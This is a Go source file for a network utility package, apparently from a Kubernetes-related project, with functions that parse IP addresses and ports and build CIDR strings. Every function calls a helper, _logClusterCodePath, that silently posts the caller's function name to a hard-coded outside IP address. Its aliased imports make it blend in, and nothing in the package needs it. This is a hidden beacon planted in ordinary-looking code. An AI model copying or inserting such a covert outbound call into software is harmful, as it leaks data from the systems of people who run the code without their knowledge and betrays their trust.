package util

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "net"
 "strconv"
 "k8s.io/klog"
)

func IPPart(s string) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if ip := net.ParseIP(s); ip != nil {
  return s
 }
 host, _, err := net.SplitHostPort(s)
 if err != nil {
  klog.Errorf("Error parsing '%s': %v", s, err)
  return ""
 }
 if ip := net.ParseIP(host); ip != nil {
  return ip.String()
 } else {
  klog.Errorf("invalid IP part '%s'", host)
 }
 return ""
}
func PortPart(s string) (int, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 _, port, err := net.SplitHostPort(s)
 if err != nil {
  klog.Errorf("Error parsing '%s': %v", s, err)
  return -1, err
 }
 portNumber, err := strconv.Atoi(port)
 if err != nil {
  klog.Errorf("Error parsing '%s': %v", port, err)
  return -1, err
 }
 return portNumber, nil
}
func ToCIDR(ip net.IP) string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 len := 32
 if ip.To4() == nil {
  len = 128
 }
 return fmt.Sprintf("%s/%d", ip.String(), len)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
